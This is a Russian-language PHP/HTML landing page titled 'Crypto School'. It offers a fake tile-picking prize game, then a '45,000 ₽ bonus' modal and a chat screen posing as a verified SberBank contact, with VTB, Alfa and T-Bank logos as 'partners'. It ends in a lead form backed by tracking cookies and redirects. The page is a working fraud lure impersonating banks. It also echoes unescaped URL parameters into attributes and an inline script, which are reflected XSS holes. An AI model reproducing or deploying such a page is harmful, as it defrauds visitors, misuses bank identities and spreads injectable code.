<?php
if (!isset($rawClick) && !isset($click)) {
  die();
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Crypto School</title>
    <link rel="icon" href="./img/icons/favicon.ico" type="image/x-icon" />
    <link rel="stylesheet" href="normalize.css" />
    <link rel="stylesheet" href="styles.css" />
    <link rel="stylesheet" href="chat.css" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:ital,wght@0,100..700;1,100..700&display=swap"
      rel="stylesheet"
    />

    <script src="form/js/libs/intlTelInput.js"></script>

    <script>
      let scriptLoadings = false;
      // Функция для получения значения параметра из URL
      function getUrlParam(name) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(name);
      }

      // Проверяем наличие параметров
      const bgeValue = getUrlParam("bge");
      const crmSource = getUrlParam("crm_source");

      if (bgeValue) {
        // Если есть только bgeValue – подключаем скрипты для bge
        let inlineScript = document.createElement("script");
        inlineScript.innerHTML = `
      window.bgdataLayer = window.bgdataLayer || [];
      function bge() { bgdataLayer.push(arguments); }
      bge('init', '${bgeValue}');
    `;
        document.head.appendChild(inlineScript);

        // Подключаем второй скрипт для bge
        let asyncScript = document.createElement("script");
        asyncScript.src =
          "https://api.imotech.video/ad/events.js?pixel_id=" + bgeValue;
        document.head.appendChild(asyncScript);

        // Ожидаем загрузки всех скриптов, чтобы продолжить выполнение (если нужно)
        asyncScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки всех скриптов
          console.log("Все скрипты для BGE загружены!");
        };
      } else if (!crmSource) {
        // Если НЕТ ни bgeValue, ни crmSource – подключаем альтернативные скрипты
        let trackScript = document.createElement("script");
        trackScript.type = "application/javascript";
        trackScript.src = "track.js?v=21238";
        document.head.appendChild(trackScript);

        trackScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки track.js
          console.log("track.js загружен!");
          window.removeEventListener("beforeunload", trackClose);
        };

        let inlineScript = document.createElement("script");
        inlineScript.innerHTML = `
      function getCookie(name) {
        let matches = document.cookie.match(
          new RegExp("(?:^|; )" + name.replace(/([.$?*|{}()[]\\/+^])/g, "\\$1") + "=([^;]*)")
        );
        return matches ? decodeURIComponent(matches[1]) : undefined;
      }

      const subid_1 = getCookie("_subid");

      var offerData = {
        subid: subid_1,
        buyer: "{buyer}",
        crm_campaign: "{crm_campaign}",
        thank_you_page: "{thank_you_page}",
        landing_name: "offer_id_" + "{offer_id}",
        app_key: "{app_key}",
        bge: "{bge}",
        ts_id: "{ts_id}",
        info: "{info}"
      };
    `;
        document.head.appendChild(inlineScript);

        inlineScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки inlineScript
          console.log("Inline script для альтернативы загружен!");
        };

        let parseScript = document.createElement("script");
        parseScript.type = "application/javascript";
        parseScript.src = "parse_url.js?v=19";
        document.head.appendChild(parseScript);

        scriptLoadings = true;

        parseScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки parse_url.js
          console.log("parse_url.js загружен!");
        };
      }
    </script>

    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie =
          name + "=" + value + ";path=/;expires=" + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{subid}".match("{")) {
          return "{subid}";
        }
        var clientSubid =
          '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (!clientSubid.match(">")) {
          return clientSubid;
        }
        if (params.get("_subid")) {
          return params.get("_subid");
        }
        if (params.get("subid")) {
          return params.get("subid");
        }
        if (getCookie("subid")) {
          return getCookie("subid");
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{token}".match("{")) {
          return "{token}";
        }
        var clientToken =
          '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (!clientToken.match(">")) {
          return clientToken;
        }
        if (params.get("_token")) {
          return params.get("_token");
        }
        if (params.get("token")) {
          return params.get("token");
        }
        if (getCookie("token")) {
          return getCookie("token");
        }
        return null;
      }

      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{pixel}".match("{")) {
          return "{pixel}";
        }
        if (params.get("pixel")) {
          return params.get("pixel");
        }

        if (getCookie("pixel")) {
          return getCookie("pixel");
        }

        return null;
      }

      if (typeof URLSearchParams === "function") {
        document.addEventListener("DOMContentLoaded", function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();

          params.set("_token", token);
          setCookie("pixel", pixel);
          setCookie("token", token);
          setCookie("subid", subid);
        });
      }
    </script>
  </head>
  <body>
    <main class="main">
      <div class="main__screen--first" id="first-screen">
        <div class="header--first">
          <div class="header__logo">
            <span class="header__logo-text">Crypto School</span>
          </div>
        </div>
        <section class="main__section primary">
          <div class="main__section-primary__container">
            <span class="main__section-primary__container-item top"
              >Выиграй свой приз</span
            >
            <span class="primary__text hidden">Вы выиграли</span>
            <p
              class="main__section-primary__container-item"
              id="sum-start-text"
            >
              до <span class="secondary" id="sum-text">10 000 ₽</span>
            </p>
          </div>
        </section>
        <section class="main__section third">
          <span class="third__subheading">Выберите 3 плитки</span>
          <div class="third__plates">
            <div class="plates__item">
              <div class="plates__inner">
                <div class="plates__front"></div>
                <div class="plates__back"></div>
              </div>
            </div>
            <div class="plates__item">
              <div class="plates__inner">
                <div class="plates__front"></div>
                <div class="plates__back"></div>
              </div>
            </div>
            <div class="plates__item">
              <div class="plates__inner">
                <div class="plates__front"></div>
                <div class="plates__back"></div>
              </div>
            </div>
            <div class="plates__item">
              <div class="plates__inner">
                <div class="plates__front"></div>
                <div class="plates__back"></div>
              </div>
            </div>
            <div class="plates__item">
              <div class="plates__inner">
                <div class="plates__front"></div>
                <div class="plates__back"></div>
              </div>
            </div>
            <div class="plates__item">
              <div class="plates__inner">
                <div class="plates__front"></div>
                <div class="plates__back"></div>
              </div>
            </div>
            <div class="plates__item">
              <div class="plates__inner">
                <div class="plates__front"></div>
                <div class="plates__back"></div>
              </div>
            </div>
            <div class="plates__item">
              <div class="plates__inner">
                <div class="plates__front"></div>
                <div class="plates__back"></div>
              </div>
            </div>
            <div class="plates__item">
              <div class="plates__inner">
                <div class="plates__front"></div>
                <div class="plates__back"></div>
              </div>
            </div>
            <div class="backdrop-layer"></div>
          </div>
          <div class="main__section-secondary__container-confetti">
            <img
              src="./img/confettiL.png"
              alt="Confetti Left"
              class="confetti confetti--left"
            />
            <img
              src="./img/confettiR.png"
              alt="Confetti Right"
              class="confetti confetti--right"
            />
          </div>
          <button class="main__section-third__container-button hidden">
            Забрать выигрыш
          </button>
          <p class="main__section-third__container-text" id="footer-text">
            ДЛЯ УЧАСТИЯ В АКЦИИ ВЫ ДОЛЖНЫ БЫТЬ СОВЕРШЕННОЛЕТНИМ ГРАЖДАНИНОМ ИЛИ
            РЕЗИДЕНТОМ РФ
          </p>
        </section>
      </div>
      <div class="backdrop d-none">
        <div class="modal">
          <h2 class="title-partners">поздравляем, Вам доступен бонус до</h2>
          <h2 class="title-bonus">45 000 ₽</h2>
          <p class="title__after">
            после прохождения КРАТКОГО ОПРОСА от одного из наших партнËров
          </p>
          <p class="text-partners">Нажмите на одного из партнёров</p>
          <ul>
            <li>
              <button class="banking-btn sber">
                <img src="./img/sber.png" alt="" />
              </button>
            </li>
            <li>
              <button class="banking-btn vtb">
                <img src="./img/vtb.png" alt="" />
              </button>
            </li>
            <li>
              <button class="banking-btn alfa">
                <img src="./img/alfa.png" alt="" />
              </button>
            </li>
            <li>
              <button class="banking-btn tbank">
                <img
                  style="
                    border-radius: 15px;
                    height: 96px;
                    margin-left: 5px;
                    width: 120px;
                  "
                  src="./img/tb.png"
                  alt=""
                />
              </button>
            </li>
          </ul>
        </div>
      </div>
      <div class="main-bg d-none">
        <div class="pattern-bg">
          <div
            class="header bg-white flex items-center justify-between pt-[15px] pb-[15px] px-2"
          >
            <div class="w-1/5">
              <img src="img/back.svg" alt="" />
            </div>
            <div
              class="w-full flex justify-center items-center text-xl"
              style="font-weight: 600"
            >
              <img
                src="img/sber-logo.webp"
                alt=""
                class="pr-2 banking-logo"
                width="60px"
                height="60px"
              />

              <div class="flex items-start">
                <div>
                  <p class="banking-title">СберБанк</p>
                  <p class="online" style="margin-top: 0">в сети</p>
                </div>
                <img
                  src="img/verified.svg"
                  class="mt-1 pl-1 pt-[2px]"
                  style="padding-top: 2px; padding-left: 0.25rem"
                  alt=""
                />
              </div>
            </div>
            <div class="w-1/4 flex justify-end items-center">
              <img src="img/phone.svg" alt="" />
            </div>
          </div>

          <div class="main-chat">
            <div class="date">Сегодня</div>
          </div>
          <form
            class="form _main-form contact-form freg thin rounded hidden"
            id="main-form"
            method="post"
          >
            <div class="text-block-6">
              <h2
                class="form-heading"
                style="text-align: center; align-items: center"
              >
                Заполните форму
              </h2>
            </div>
            <input type="hidden" id="utm_medium" value='<?= $_GET['utm_medium'] ?>'>
            <input type="hidden" id="campaing_id" value='<?= $_GET['campaing_id'] ?>'>
            <input type="hidden" id="slug" value='<?= $_GET['slug'] ?>'> <input
            type="hidden" id="bge" value='<?= $_GET['bge'] ?>'> <input
            type="hidden" id="source" value='<?= $_GET['source'] ?>'>
          </form>
        </div>
      </div>
    </main>
    <script src="main.js?v=45"></script>
    <script src="chat.js"></script>
    <script src="loadAssets.js?v=321"></script>

    <script>
      window.onload = function () {
        var err = localStorage.getItem("unsuitable");
        var thx = localStorage.getItem("thanks");
        if (err && err === "false") {
          const fileErr = "err.html";
          window.location.href = `${fileErr}${window.location.search}`;
        } else if (thx && thx === "true") {
          const fileThx = "thanks2.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };

      window.onpageshow = function () {
        var err = localStorage.getItem("unsuitable");
        var thx = localStorage.getItem("thanks");
        if (err && err === "false") {
          const fileErr = "err.html";
          window.location.href = `${fileErr}${window.location.search}`;
        } else if (thx && thx === "true") {
          const fileThx = "thanks2.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };
    </script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>
  </body>
</html>
